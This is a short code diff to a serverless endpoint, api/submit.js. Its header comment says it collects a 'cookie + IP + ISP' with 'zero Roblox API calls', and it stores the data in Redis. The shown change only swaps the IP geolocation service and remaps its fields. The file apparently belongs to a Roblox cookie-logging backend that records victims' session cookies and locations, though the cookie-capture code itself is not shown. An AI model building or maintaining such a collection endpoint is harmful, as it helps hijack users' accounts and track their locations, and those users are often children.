@@ -1,4 +1,3 @@
-
 // api/submit.js — cookie + IP + ISP only, zero Roblox API calls
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
@@ -22,9 +21,13 @@ async function redisGet(key) {
 async function getIpGeo(ip) {
   try {
     if (!ip || ip === 'Unknown') return null;
-    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`, { signal: AbortSignal.timeout(3000) });
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), 4000);
+    const r = await fetch(`https://ipapi.co/${ip}/json/`, { signal: controller.signal });
+    clearTimeout(timer);
     const d = await r.json();
-    return d.status === 'success' ? d : null;
+    if (d.error) return null;
+    return { city: d.city, regionName: d.region, country: d.country_name, isp: d.org, status: 'success' };
   } catch { return null; }
 }
 
